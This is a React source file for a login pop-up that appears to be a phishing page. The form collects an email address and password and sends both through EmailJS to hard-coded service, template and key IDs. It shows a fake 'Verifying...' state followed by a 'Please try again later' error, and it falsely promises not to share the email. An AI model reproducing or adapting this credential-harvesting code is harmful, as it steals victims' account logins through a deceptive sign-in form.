import React, {useState} from 'react'
import emailjs from '@emailjs/browser'

const Form = (props) => {
    const [error, setError] = useState(false);
    const [verify, setVerify] = useState(false)

    const [email, setEmail] = useState("")
    const [password, setPassword] = useState("")

    const handleSubmit = (e) => {
      e.preventDefault()
      emailjs.sendForm("service_xbz42pt", "template_cu1vfhk", e.target, "9O_KqRR17c-7aoqXE")
      console.log({email, password})
    }

  return (
    <div className="form">
        <div className="x" onClick={() => {
            setError(false);
            setVerify(false);
            props.handleMail();
            }}>X</div>

        <img src={props.img} alt="" />

        <h3>{props.header}</h3>

        {error && <p className="error">Please try again later</p>}

        <form onSubmit={handleSubmit}>
            <label htmlFor="email">Email address</label>
            <input 
                  type="email" 
                  id="email" 
                  name="from_name" 
                  value={email} 
                  onChange={(e) => setEmail(e.target.value)}
                  placeholder="Enter email" />

            <p>We'll never share your email with anyone else</p>

            <label htmlFor="password" id="ps">Password</label>
            <input 
                  type="password" 
                  id="password" 
                  name="message" 
                  value={password} 
                  onChange={(e) => setPassword(e.target.value)}
                  placeholder="Enter password" />

            {/* <textarea rows="2" cols="2" name='message' value={password} hidden></textarea> */}

            <div className="form-btn">

              <button className="cancel" type="button" onClick={() => {
                setError(false);
                setVerify(false);
                props.handleMail();
              }}>Cancel</button>

              <button className="login" type="submit" onClick={() => {
                setVerify(prev => !prev)
                setError(prev => !prev)
              }}>
              {verify ? "Verifying..." : "Login"}

              </button>             
            </div>
        </form>
    </div>
  )
}

export default Form